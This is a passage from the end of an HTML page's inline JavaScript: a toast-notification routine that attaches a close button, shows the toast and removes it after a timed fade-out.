		    });
		    toast.appendChild(closeBtn);
		
		    container.appendChild(toast);
		
		    setTimeout(function() {
		        toast.classList.add('notification-leave-active');
		        setTimeout(function() {
		            removeToast(toast);
		        }, 300);
		    }, 4000);
		
		    function removeToast(toast) {
		        if (toast.parentNode) {
		            toast.parentNode.removeChild(toast);
		        }
		    }
		}
	</script>
</body>
</html>